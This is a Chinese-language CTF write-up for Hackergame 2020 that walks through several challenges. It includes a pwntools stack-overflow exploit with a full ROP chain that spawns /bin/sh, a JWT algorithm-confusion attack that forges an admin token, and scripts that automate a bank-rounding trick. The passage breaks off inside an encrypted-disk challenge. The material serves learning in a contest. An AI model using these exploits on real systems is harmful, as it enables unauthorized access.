镜像实际上就是由这样的一层层文件进行叠加起来的，上层的文件会覆盖下层的同名文件。而各层里有重复的文件，因此镜像要大得多。这些层合并在一起就成了容器里的内容。 也正是如此，flag 也能够被找到了23333. 从零开始的 HTTP 链接 众所周知，数组下标应当从 0 开始。 同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。 你能成功连接到 0 号端口并拿到 flag 吗？ 点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。 http://202.38.93.111:0/ 这个真的有意思。一般 TCP 端口都是1-65535，于是很多客户端都不支持 0 号端口。 好在部分版本的 curl 以及 wget 支持。 然而我在本地跑还连不上这个端口，怕是被运营商掐断了？ 在VPS上试试，发现可行。 curl http://202.38.93.111:0 # 或者 # wget http://202.38.93.111:0 得到一个网页，发现是一个 xterm 终端，和其他题目的在线终端一样的。 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\" /&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt; &lt;title&gt;Terminal&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"/js/xterm/css/xterm.css\" /&gt; &lt;script src=\"/js/xterm/lib/xterm.js\"&gt;&lt;/script&gt; &lt;script src=\"/js/xterm-addon-attach/lib/xterm-addon-attach.js\"&gt;&lt;/script&gt; &lt;script src=\"/js/xterm-addon-fit/lib/xterm-addon-fit.js\"&gt;&lt;/script&gt; &lt;style&gt; #terminal { position: absolute; top: 0; right: 0; bottom: 0; left: 0; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"terminal\"&gt;&lt;/div&gt; &lt;script&gt; const term = new Terminal(); const fitAddon = new FitAddon.FitAddon(); term.loadAddon(fitAddon); term.open(document.getElementById(\"terminal\")); fitAddon.fit(); window.addEventListener('resize', function(event) { fitAddon.fit(); }); var firstmsg = true; const socket = new WebSocket( location.origin.replace(/^http/, \"ws\") + \"/shell\" ); const attachAddon = new AttachAddon.AttachAddon(socket); term.loadAddon(attachAddon); socket.onclose = event =&gt; { term.write(\"\\nConnection closed\"); }; socket.onmessage = event =&gt; { if (firstmsg) { firstmsg = false; let token = new URLSearchParams(window.location.search).get(\"token\"); window.history.replaceState({}, null, '/'); if (token) { localStorage.setItem('token', token); } else { token = localStorage.getItem('token'); } if (token) socket.send(token + \"\\n\"); } }; term.focus(); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 这个逻辑是访问网页后实例化一个 WebSocket，将 HTTP 升级到 WS 协议，URI 为 ws://202.38.93.111:0/shell 于是乎就去找 websocket 客户端来实现。 最开始想用 pwntools，发现能作为 socket 连上但还模仿不了 ws（可能没领悟到。 之后找到了 GitHub 上的 **websocket-client**，这是一个 Python 的 ws 库，本来想直接用他现成的 wsdump.py，发现连不上。。 最后又找了个编译好的客户端，**websocat**，按照安装说明进行安装，再连接服务器就完事了。 来自一教的图片 小 P 在一教做傅里叶光学实验时，在实验室电脑的模拟程序里发现了这么一张的图片： 数理基础并不扎实的小 P 并不知道什么东西成像会是这个样子：又或许什么东西都不是，毕竟这只是模拟 … 但可以确定的是，这些看似奇怪的花纹里确实隐藏着一些信息，或许是地下金矿的藏宝图也未可知。 根据提示应该与 傅里叶变换 有关。 给图片做个 FFT 处理，就得到 flag 了。 拼一下就能得到 flag{Fxurier_xptics_is_fun} 噢 Fourier optics 的确是傅里叶光学，嘻嘻嘻。 超简陋的 OpenGL 小程序啥也不懂，魔改就是了。 把文件删了点东西，他出来这样的。 不对劲，查了一下这个好像是 OpenGL着色器语言(GLSL)。 有机会可以看看 OpenGL 入门文档。 最后魔改了 basic_lighting.vs 这个文件。看不清楚就改改偏移就好了。 void main() { FragPos = vec3(projection * vec4(aPos-0.45, 1.0)); Normal = aNormal; gl_Position = projection * view * vec4(FragPos, 1.0); } flag{glGraphicsHappy(233);} 生活在博弈树上始终热爱大地是个最基本的栈溢出。 gets(input);函数存在漏洞，看一下栈上情况。 input 对应 v14，success 对应 v17 偏移为 -0x01-(-0x90) = 0x8F bool 库里的 true 为 0x01。 把这个 success 覆盖为 0x01 就能出 flag 了。 #!/usr/bin/python3 # coding: utf-8 \"\"\" Hackergame_tictactoe @Author: MiaoTony @Time: 20201103 \"\"\" from pwn import * context.log_level = 'debug' token = 'xxxxxxxxxxxxxxxxxxx' sh = remote(\"202.38.93.111\", 10141) sh.sendlineafter('Please input your token: ', token) payload = b'1' * 0x8F payload += b'\\x01' sh.sendlineafter('such as (0,1): ', payload) sh.interactive() flag{easy_gamE_but_can_u_get_my_shel1} 升上天空要拿 shell 啊。。 先用 ROPgadget 生成 ROP Chain. ROPgadget --binary tictactoe --ropchain 然后把这个放到返回值的位置打过去就完事了。 #!/usr/bin/python3 # coding: utf-8 from struct import pack from pwn import context, remote context.log_level = 'debug' token = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX' sh = remote(\"202.38.93.111\", 10141) sh.sendlineafter('Please input your token: ', token) payload = b'1' * 0x8F payload += b'\\x01' payload += b'1' * 8 # Padding goes here p = b'' p += pack('&lt;Q', 0x0000000000407228) # pop rsi ; ret p += pack('&lt;Q', 0x00000000004a60e0) # @ .data p += pack('&lt;Q', 0x000000000043e52c) # pop rax ; ret p += b'/bin//sh' p += pack('&lt;Q', 0x000000000046d7b1) # mov qword ptr [rsi], rax ; ret p += pack('&lt;Q', 0x0000000000407228) # pop rsi ; ret p += pack('&lt;Q', 0x00000000004a60e8) # @ .data + 8 p += pack('&lt;Q', 0x0000000000439070) # xor rax, rax ; ret p += pack('&lt;Q', 0x000000000046d7b1) # mov qword ptr [rsi], rax ; ret p += pack('&lt;Q', 0x00000000004017b6) # pop rdi ; ret p += pack('&lt;Q', 0x00000000004a60e0) # @ .data p += pack('&lt;Q', 0x0000000000407228) # pop rsi ; ret p += pack('&lt;Q', 0x00000000004a60e8) # @ .data + 8 p += pack('&lt;Q', 0x000000000043dbb5) # pop rdx ; ret p += pack('&lt;Q', 0x00000000004a60e8) # @ .data + 8 p += pack('&lt;Q', 0x0000000000439070) # xor rax, rax ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000402bf4) # syscall payload += p sh.sendlineafter('such as (0,1): ', payload) sh.interactive() 来自未来的信笺（复现） 你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。 “Send from Arctic.” 正文就只有这一句话。 「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。 看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。 这题做的时候已经想到是 GitHub Archive Program 了，但没想到真就整了一题。 一堆二维码。第一张出来是个 META. 前几张二维码里有一张内容是 GitHub 的 API 列表。对应的仓库是 openlug/nonexist。 然后我真去找了，发现没有，一种可能是 Private Repo，可能之前有过 Public？ 于是去找了一些公开的 GitHub Archive 网站，并没有找到。 另一种可能就是假的了，真不存在。 不管了先把所有的二维码给解码出来，合并到一个文件里。 比赛做题的时候用的 Python 的 pyzbar 库，还特地注意了用 rb 以二进制来写入文件，然而出来的文件啥也不是……啥文件头都找不到，就离谱。 比赛结束了才知道是这个解析库本身存在问题，在 \\x00 处会截断。 参考官方 WP 以及 总榜 rk1 大师傅的 WP，可以用 zbarimg 这个命令行工具来解码。 （脏话一堆，别问，问就是装 zbarimg 心态炸了 这里就用 Python 调用命令行来执行好了。 import os file_list = list(os.walk('./frames'))[0][2] for f in file_list: fi = './frames/' + f cmd = 'zbarimg --raw -Sbinary %s &gt;&gt; frames.tar' os.system(cmd % fi) 然后这个出来的 frames.tar 是个压缩包，解压再解压就能拿到 flag 了。 BTW, 比赛结束才知道那个 META 其实并不是个 Private Repo，而是 openlug/django-common，就去年 hackergame 的一道题。。 狗狗银行这题也有点意思。 四舍五入薅羊毛大法好啊。（当然这也是一种可行方案啦） 储蓄卡 利率每日 0.3% 因此 五入 最少需要 0.5/0.003=167。 信用卡 利率每日 0.5%，最低 10 最划算的话是 10/0.005=2000，且欠款在 2000 到 2100 之间每日利息都是10。 把欠款控制在这个范围内就能薅羊毛了。 2000/167 =&gt; 12 借款分到12张储蓄卡中。 首先开6张信用卡，开12*6张储蓄卡，且依次转账到储蓄卡，每张卡167，确保每天有1的利息。 首先用初始的储蓄卡1000元吃饭，等储蓄卡余额 &gt;= 177 的时候就能用储蓄卡还款+吃饭了。 最开始点的手累死了，想想算了写脚本吧。 首先把各个方法封装好。 # -*- coding: utf-8 -*- \"\"\" Hackergame 2020 狗狗银行 @Author: MiaoTony @Time: 20201102 \"\"\" import requests import json url_prefix = r'http://202.38.93.111:10100/api/' headers = { \"Host\": \"202.38.93.111:10100\", \"Origin\": \"http://202.38.93.111:10100\", \"Referer\": \"http://202.38.93.111:10100/\", \"Content-Type\": \"application/json;charset=utf-8\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Connection\": \"keep-alive\", \"Cache-Control\": \"max-age=0\", \"Authorization\": \"Bearer &lt;your_token&gt;\", \"Cookie\": \"session=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\", } session = requests.Session() session.headers = headers def create_card(kind): \"\"\" 办卡 :param kind: {str} `credit`信用卡，`debit`储蓄卡 \"\"\" url = url_prefix + 'create' payload = {\"type\": kind} r = session.post(url, json=payload) r.encoding = 'utf-8' print(r.text) return r.text def get_info(): \"\"\" 获取用户信息 \"\"\" url = url_prefix + 'user' r = session.get(url) r.encoding = 'utf-8' # print(r.json()) return r.json() def get_balance(): \"\"\" 获取净资产 \"\"\" info = get_info() accounts = info.get('accounts') balance = 0 for account in accounts: if account.get('type') == 'debit': balance += account.get('balance') if account.get('type') == 'credit': balance -= account.get('balance') return balance def get_debt(): \"\"\" 获取欠款 \"\"\" info = get_info() accounts = info.get('accounts') for account in accounts: if account.get('type') == 'credit': debt = account.get('balance') break return debt def transfer(src, dst, amount): \"\"\" 转账 \"\"\" url = url_prefix + 'transfer' payload = {\"src\": src, \"dst\": dst, \"amount\": amount} r = session.post(url, json=payload) r.encoding = 'utf-8' print(r.text) return r.text def eat(account): \"\"\" 吃饭 \"\"\" url = url_prefix + 'eat' payload = {\"account\": account} r = session.post(url, json=payload) r.encoding = 'utf-8' print(r.text) return r.text 办卡、转账。 # 先办卡 1储蓄卡 2-7信用卡 8-79储蓄卡 for i in range(6): print(i) create_card('credit') for i in range(6 * 12): print(i) create_card('debit') info = get_info() # 转账，每张卡转167 for credit_id in range(2, 8): print(credit_id) for i in range(12): dst = 8 + 12 * (credit_id-2) + i amount = 167 transfer(src=credit_id, dst=dst, amount=amount) 最后是每天稳定赚2狗币，写个循环。 当欠款到了2104时依次用储蓄卡还款，一直还到2004，否则就每天恰饭顺便薅羊毛。 debit_card_id = 8 # 储蓄卡 credit_card_id = 2 # 信用卡 while True: debt = get_debt() if get_debt() == 2104: for i in range(10 * 6): print(i) # 依次用后面的储蓄卡给信用卡还款 transfer(debit_card_id, credit_card_id, 10) debit_card_id += 1 credit_card_id += 1 if credit_card_id &gt; 7: credit_card_id = 2 if debit_card_id &gt; 79: debit_card_id = 8 print(\"==============================\") print(get_balance()) eat(debit_card_id) debit_card_id += 1 if debit_card_id &gt; 79: debit_card_id = 8 if get_balance() &gt;= 2000: print(get_info()) break 跑了贼久，终于得到 flag 了。 超基础的数理模拟器（复现） 这题需要有很扎实的数理基础才行……（废话 第一种解法是手算或者直接按计算器，但我按了几题放弃了。 另外一种是借助网络上公开的计算器，准备爬个接口或者自己构造一个接口来用，搜遍了发现有几个可能可以用的： 一步步解的计算器 symbolab 定积分计算器 WolframAlpha etc. 然而发现都不能直接解析题目所给的 LaTeX，或者解不出来，再或者解出来的话精度也不够…… 还有一种方案，是调用本地的服务解析 LaTeX，再进行积分运算。 于是想到了某红色软件，Mathematica，又称 MMA。 早就听说这玩意符号计算贼厉害了，虽然之前也没用过，还是比赛现装现学的，但用了就发现真的强，太香了，早知道用来解高数里的微积分题多好。 搜了搜发现 MMA 支持解析 LaTeX 表达式，太好了！ 原理就是用 Python 的 requests 库把题目网页爬下来，用 Beautifulsoup 解析得到 LaTeX 公式，调用 MMA 解析表达式并进行积分运算，最后用 requests 提交答案，做一个循环解个400题就完事了。 参考 Wolfram 官方文档 生成和导入 TeX，可以用下面的语句将 LaTeX 转换为 MMA 的表达式。 ToExpression[\"input\",TeXForm] 但由于 MMA 不支持这个题目给的这个 LaTeX 格式，需要把积分上下限提取出来，最后的 {d x} 也要替换为 dx，所有的单斜杠 \\ 要替换为双斜杠 \\\\，积分表达式也要用 \\\\left( \\\\right) 包含起来。 好了，现在在 MMA 里调好能解析 LaTeX 并积分了，下面来整和 Python 的接口。 参考 wolfram 官方文档 Wolfram Client Library for Python，官方提供了一个客户端进行交互，也可以在 MMA 里调用 Python 执行。 然而！其他都能用，一把上述调好的解析 LaTeX 的代码用这个 client 执行，终端就卡死了，啥反应没有，人傻了。试了好久不知道是我写的问题还是他本身的问题了。。 最后实在不行，改用命令行执行，可以调用安装目录下的 wolframscript -code &lt;CodeHere&gt; 来执行代码。就类似于 Python 的 python3 -c &lt;CodeHere&gt; 用法。 然而发现也不行，可能由于引号和[ ]的问题语法不对执行失败了。 最后没办法了，干脆直接跑个终端吧。 参考 windows下python3如何调用mathematica进行高级计算 这一篇，用 winpexpect 来进行交互式操作。 （发现有大师傅直接用 pwntools 进行交互，其实也行 2333. 具体现在一会儿还说不清楚，后面专门写一篇讲这个交互的吧，代码还没优化好，终端超时还没处理好以至于会开一堆终端…… 反正就调用 MMA 去计算，然后输出结果读进来，调用 /submit 接口提交答案。 好不容易到这一步都差不多了，心态已经炸的不行了（已经调了一下午了）。结果发现怎么一直卡在 399 题下不去？？？ 开始怀疑我 POST 请求参数是不是不对，题目需要的是 x-www-form-urlencoded，难不成整了 form-data 或者其他的？ 用 httpbin 试了试，又在 VPS 上搭了个接口接收试了试，没毛病啊…… 再看代码，难不成 cookie 炸了。写了挺多爬虫了，一般都用 requests.Session() 维持 Cookie 状态，之前也没碰到炸的，不会这里坏掉吧。 再去研究了亿次提交过程，发现 POST 会带上此时的 Cookie，返回一个302跳转，同时 Set-Cookie，跳转之后 GET 方法带上新的 Cookie 去访问根目录，得到返回的同时又设置了新的 Cookie。 手动用 Postman 模拟了一下，如果（跟随 302 跳转）不及时更新 Cookie 的话，确实会一直卡在之前的状态，甚至连 答案正确、答案错误之类的话都一模一样，还需解答的题目数量也不变，太草了！ 于是比赛的时候就卡这里了。又调了一晚上心态彻底炸了。。 （后来就没打了 现在想想应该是我把初始的 Cookie 写到了 Headers 里的原因吧，后面单独设置 cookie，慢慢优化代码再试试。 20201109 Update: 优化了亿下，现在差不多了，能流畅求解了，后面专门写一篇讲讲 Python 和 MMA 交互的。 （留坑） 先简单说一说吧。 参考 Mathematica 计算式： NIntegrate[ToExpression[\"\\\\sqrt{x} + \\\\frac{5}{x} + \\\\ln\\\\left(x\\\\right) + \\\\sin\\\\left(\\\\ln\\\\left(x\\\\right)\\\\right)\",TeXForm],{x,ToExpression[\"\\\\frac{2}{3}\",TeXForm],ToExpression[\"\\\\frac{4}{3}\",TeXForm]},WorkingPrecision-&gt;12] 之前试了直接用 ToExpression 把包含 \\\\int_{}^{} 的积分表达式全部写进去，但发现计算速度特别慢，甚至会卡死，而且结果也不对。 还是单独把被积表达式、上下限提取出来，用自带的 NIntegrate 积分求解，顺便指定精度来的实在。 另外，这个题目卡在 399 题下不去的原因应该是初始时候的 Cookie 设置不对，在302跳转的设置上，经测试，allow_redirects 无论是 True 或者 False，Cookie 都能正确更新，也就是说用 requests.Session() 来维持 Cookie 状态是没问题的。 在最开始的时候加上一个登录，把自己的 token 带上就能解决问题了，与allow_redirects 设置无关。这题甚至连 headers 都不需要设置。 参考代码如下。 from urllib.parse import quote_plus import requests session = requests.Session() token = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX' resp = session.get( f\"http://202.38.93.111:10190/login?token={quote_plus(token)}\") print(resp.cookies) # ... 看了官方 WP 发现 Python 里的 sympy 库居然自带有解析 LaTeX 的，害，还是太菜了。 普通的身份认证器 近日，小 T 接手了某个老旧 Python 网站的重构工作。接手之后，他把原先的 requirements.txt 复制到了新项目下，更换了后端框架，照着框架文档魔改了身份认证部分的内容，写出了一个测试用的原型。看起来一切都很正常，只是他似乎没有仔细检查每一项依赖的版本。 「懒得管了，又不是不能用！」但果真如此吗？ 登录后会返回一个 access_token，base64 解码一下很明显是 JWT。当然 JavaScript 代码里逻辑也很明显了。 {\"typ\":\"JWT\",\"alg\":\"RS256\"}.{\"sub\":\"guest\",\"exp\":1604399671}......... 一个 JWT 实际上就是一个字符串，它由三部分组成：头部 Header、载荷 Payload 与签名 Signature。将这三段信息文本用.链接一起就构成了 JWT 字符串。 参考官网 https://jwt.io/ 以及 阮一峰的 JSON Web Token 入门教程 再点击 获取用户信息 时把这个 jwt 放到 请求头的 Authorization 参数里，同时也带上 Hg-Token 即你自己 hackergame 的 token。 根据题目提示，身份认证的版本上有漏洞，查了一下。 参考 JWT Attack Walk-Through 一文。 There’s a well-known defect [1] with older versions of certain libraries where you can trick a JSON Web Token (JWT) consumer that expects tokens signed using asymmetric cryptography into accepting a symmetrically signed token. This article assumes you’re comfortable with JWTs and the theory of this attack, but the nub of it is that by switching the token algorithm from ‘RS’ to ‘HS’, a vulnerable endpoint will use its public key to verify the token in a symmetric way (and being public, that key isn’t much of a secret). 简单的说就是把 RS -&gt; HS，而后后端就用公钥去验证 token。 另外根据 HTML 里的提示，系统用了 FastAPI, Axios and Vue.js。 其中 FastAPI 自身带有 API 文档。 在这题中就是 http://202.38.93.111:10092/docs 以及 http://202.38.93.111:10092/redoc 发现有一个 POST /debug 的接口，请求一下试试。 正好合适，这应该就是我们需要的公钥了。 -----BEGIN RSA PUBLIC KEY----- MIICCgKCAgEAn/KiHQ+/zwE7kY/Xf89PY6SowSb7CUk2b+lSVqC9u+R4BaE/5tNF eNlneGNny6fQhCRA+Pdw1UJSnNpG26z/uOK8+H7fMb2Da5t/94wavw410sCKVbvf ft8gKquUaeq//tp20BETeS5MWIXp5EXCE+lEdAHgmWWoMVMIOXwaKTMnCVGJ2SRr +xH9147FZqOa/17PYIIHuUDlfeGi+Iu7T6a+QZ0tvmHL6j9Onk/EEONuUDfElonY M688jhuAM/FSLfMzdyk23mJk3CKPah48nzVmb1YRyfBWiVFGYQqMCBnWgoGOanpd 46Fp1ff1zBn4sZTfPSOus/+00D5Lxh6bsbRa6A1vAApfmTcu026lIb7gbG7DU1/s eDId9s1qA5BJpzWFKO4ztkPGvPTUok8hQBMDaSH1JOoFQgfJIfC7w2CQe+KbodQL 3akKQDCZhcoA4tf5VC6ODJpFxCn6blML5cD6veOBPJiIk8DBRgmt2AHzOUju+5ns QcplOVxW5TFYxLqeJ8FPWqQcVekZ749FjchtAwPlUsoWIH0PTSun38ua8usrwTXb pBlf4r0wz22FPqaecvp7z6Rj/xfDauDGDSU4hmn/TY9Fr+OmFJPW/9k2RAv7KEFv FCLP/3U3r0FMwSe/FPHmt5fjAtsGlZLj+bZsgwFllYeD90VQU8Ds+KkCAwEAAQ== -----END RSA PUBLIC KEY----- 把公钥保存带 key.pem 文件中。 这里要注意一下，**换行用的是 \\n，即十六进制的 0A，而不是 \\r\\n (0D0A)。且最末尾有 \\n**。 转十六进制。 $ cat key.pem | xxd -p | tr -d \"\\\\n\" 2d2d2d2d2d424547494e20525341205055424c4943204b45592d2d2d2d2d0a4d49494343674b43416745416e2f4b6948512b2f7a7745376b592f58663839505936536f7753623743556b32622b6c5356714339752b52344261452f35744e460a654e6c6e65474e6e79366651684352412b50647731554a536e4e704732367a2f754f4b382b4837664d6232446135742f39347761767734313073434b566276660a667438674b7175556165712f2f747032304245546553354d5749587035455843452b6c45644148676d57576f4d564d494f5877614b544d6e4356474a325352720a2b784839313437465a714f612f313750594949487555446c666547692b4975375436612b515a3074766d484c366a394f6e6b2f45454f4e75554466456c6f6e590a4d3638386a6875414d2f46534c664d7a64796b32336d4a6b33434b50616834386e7a566d6231595279664257695646475951714d43426e57676f474f616e70640a34364670316666317a426e34735a546650534f75732f2b303044354c786836627362526136413176414170666d5463753032366c496237676247374455312f730a65444964397331714135424a707a57464b4f347a746b5047765054556f6b386851424d44615348314a4f6f465167664a4966433777324351652b4b626f64514c0a33616b4b5144435a68636f41347466355643364f444a704678436e36626c4d4c3563443676654f42504a69496b38444252676d743241487a4f556a752b356e730a5163706c4f56785735544659784c71654a3846505771516356656b5a373439466a6368744177506c55736f57494830505453756e3338756138757372775458620a70426c66347230777a32324650716165637670377a36526a2f7866446175444744535534686d6e2f54593946722b4f6d464a50572f396b32524176374b4546760a46434c502f3355337230464d7753652f4650486d7435666a417473476c5a4c6a2b625a736777466c6c59654439305651553844732b4b6b434177454141513d3d0a2d2d2d2d2d454e4420525341205055424c4943204b45592d2d2d2d2d0a Payload 里 加密算法由 RS256 降级为 HS256，再根据题目要求，需要把 guest 改成 admin. {\"typ\":\"JWT\",\"alg\":\"HS256\"}.{\"sub\":\"admin\",\"exp\":1604399671} base64 编码一下，且去掉结尾的 =，注意不要丢掉中间的 .。 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTYwNDM5OTY3MX0 下面开始算加密所用的签名（Signature）。 把上面得到的证书加载进来，用他来加密。 $ echo -n \"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTYwNDM5OTY3MX0\" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e20525341205055424c4943204b45592d2d2d2d2d0a4d49494343674b43416745416e2f4b6948512b2f7a7745376b592f58663839505936536f7753623743556b32622b6c5356714339752b52344261452f35744e460a654e6c6e65474e6e79366651684352412b50647731554a536e4e704732367a2f754f4b382b4837664d6232446135742f39347761767734313073434b566276660a667438674b7175556165712f2f747032304245546553354d5749587035455843452b6c45644148676d57576f4d564d494f5877614b544d6e4356474a325352720a2b784839313437465a714f612f313750594949487555446c666547692b4975375436612b515a3074766d484c366a394f6e6b2f45454f4e75554466456c6f6e590a4d3638386a6875414d2f46534c664d7a64796b32336d4a6b33434b50616834386e7a566d6231595279664257695646475951714d43426e57676f474f616e70640a34364670316666317a426e34735a546650534f75732f2b303044354c786836627362526136413176414170666d5463753032366c496237676247374455312f730a65444964397331714135424a707a57464b4f347a746b5047765054556f6b386851424d44615348314a4f6f465167664a4966433777324351652b4b626f64514c0a33616b4b5144435a68636f41347466355643364f444a704678436e36626c4d4c3563443676654f42504a69496b38444252676d743241487a4f556a752b356e730a5163706c4f56785735544659784c71654a3846505771516356656b5a373439466a6368744177506c55736f57494830505453756e3338756138757372775458620a70426c66347230777a32324650716165637670377a36526a2f7866446175444744535534686d6e2f54593946722b4f6d464a50572f396b32524176374b4546760a46434c502f3355337230464d7753652f4650486d7435666a417473476c5a4c6a2b625a736777466c6c59654439305651553844732b4b6b434177454141513d3d0a2d2d2d2d2d454e4420525341205055424c4943204b45592d2d2d2d2d0a (stdin)= 6b218e036017e7e9d3679add51314fe3fca177b2bdc0316b5944ac6aa965addc 最后一行即得到的 HMAC signature 结果，再将这个 ASCII hex signature 转换为 JWT format。 =被省略、+替换成-，/替换成_ 。（Base64URL 算法） Python 的一行代码实现。 $ python -c \"exec(\\\"import base64, binascii\\nprint base64.urlsafe_b64encode(binascii.a2b_hex('6b218e036017e7e9d3679add51314fe3fca177b2bdc0316b5944ac6aa965addc')).replace('=','')\\\")\" ayGOA2AX5-nTZ5rdUTFP4_yhd7K9wDFrWUSsaqllrdw 最后拼接得到 JWT。 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTYwNDM5OTY3MX0.ayGOA2AX5-nTZ5rdUTFP4_yhd7K9wDFrWUSsaqllrdw 把这个放到 Authorization 里。别忘了 Hg-Token。 最后得到 flag。 flag{just_A_simple_Json_Web_T0ken_exp1oit_xxxxx} 室友的加密硬盘（复现） 「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。 解压出来一个 img 文件，首先拿 WinHex 看一下。 分区1里有个 keyfile，内容为 I'm not that stupid to put plaintext key in /boot! 啊这。 分区2不知道是啥。 分区3应该就是需要破解的加密部分了。 分区4感觉像是根目录，不全。 然后在 Linux 里扔给 fdisk 看一下。 $ fdisk roommates_disk_part.img Welcome to fdisk (util-linux 2.31.1). Changes will remain in memory only, until you decide to write them. Be careful before using the write command. Command (m for help): p Disk roommates_disk_part.img: 2 GiB, 2147483648 bytes, 4194304 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disklabel type: dos Disk identifier: 0xa4ee910b Device Boot Start End Sectors Size Id Type roommates_disk_part.img1 * 2048 391167 389120 190M 83 Linux roommates_disk_part.img2 393214 16775167 16381954 7.8G 5 Extended roommates_disk_part.img5 393216 1890303 1497088 731M 82 Linux swap / Solaris roommates_disk_part.img6 1892352 3891199 1998848 976M 